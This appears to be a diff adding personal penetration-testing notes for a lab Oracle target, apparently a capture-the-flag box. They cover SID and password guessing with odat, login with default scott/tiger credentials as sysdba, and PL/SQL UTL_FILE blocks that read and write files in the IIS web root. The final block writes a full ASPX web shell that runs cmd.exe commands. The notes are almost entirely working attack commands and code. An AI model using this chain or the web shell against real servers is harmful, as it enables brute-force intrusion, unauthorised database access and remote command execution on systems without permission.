@@ -1,0 +1,53 @@
+/opt/odat$ python3 odat.py sidguesser -s 10.10.10.82 -p 1521 <- find SID
+
+cp /usr/share/metasploit-framework/data/wordlists/oracle_default_userpass.txt
+:%s/ /\//g
+^ replace space with /
+sudo python3 odat.py passwordguesser -s 10.10.10.82 -d XE --accounts-file userpass.txt
+
+Note: Or use userpass.txt from github.
+
+sqlplus64 scott/tiger@10.10.10.82:1521/XE
+SELECT * FROM Session_privs;
+SELECT * FROM User_Role_privs;
+sqlplus64 scott/tiger@10.10.10.82:1521/XE as sysdba <- this is like sudo 
+
+Note: scott/tiger is the default creds to Oracle.
+
+Oracle SQL Commands once connected:
+set SERVEROUTPUT on
+
+
+|***** READ FILE *****|
+declare
+f utl_file.file_type;
+s varchar(200);
+begin
+f := utl_file.fopen('/inetpub/wwwroot', 'iisstart.htm', 'R');
+utl_file.get_line(f,s);
+utl_file.fclose(f);
+dbms_output.put_line(s);
+end;
+/
+|***** READ FILE *****|
+
+|***** WRITE SIMPLE FILE *****|
+declare
+f utl_file.file_type;
+s varchar(200) := 'test comment';
+begin
+f := utl_file.fopen('/inetpub/wwwroot', 'test.txt', 'W');
+utl_file.put_line(f,s);
+utl_file.fclose(f);
+end;
+|***** WRITE SIMPLE FILE *****|
+
+|***** WRITE SHELL FILE *****|
+declare
+f utl_file.file_type;
+s varchar(5000) := '<%@ Page Language="C#" Debug="true" Trace="false" %><%@ Import Namespace="System.Diagnostics" %><%@ Import Namespace="System.IO" %><script Language="c#" runat="server">void Page_Load(object sender, EventArgs e){}string ExcuteCmd(string arg){ProcessStartInfo psi = new ProcessStartInfo();psi.FileName = "cmd.exe";psi.Arguments = "/c "+arg;psi.RedirectStandardOutput = true;psi.UseShellExecute = false;Process p = Process.Start(psi);StreamReader stmrdr = p.StandardOutput;string s = stmrdr.ReadToEnd();stmrdr.Close();return s;}void cmdExe_Click(object sender, System.EventArgs e){Response.Write("<pre>");Response.Write(Server.HtmlEncode(ExcuteCmd(txtArg.Text)));Response.Write("</pre>");}</script><HTML><body ><form id="cmd" method="post" runat="server"><asp:TextBox id="txtArg" runat="server" Width="250px"></asp:TextBox><asp:Button id="testing" runat="server" Text="excute" OnClick="cmdExe_Click"></asp:Button><asp:Label id="lblText"  runat="server">Command:</asp:Label></form></body></HTML>';
+begin
+f := utl_file.fopen('/inetpub/wwwroot', 'CommentsWelcome.aspx', 'W');
+utl_file.put_line(f,s);
+utl_file.fclose(f);
+end;
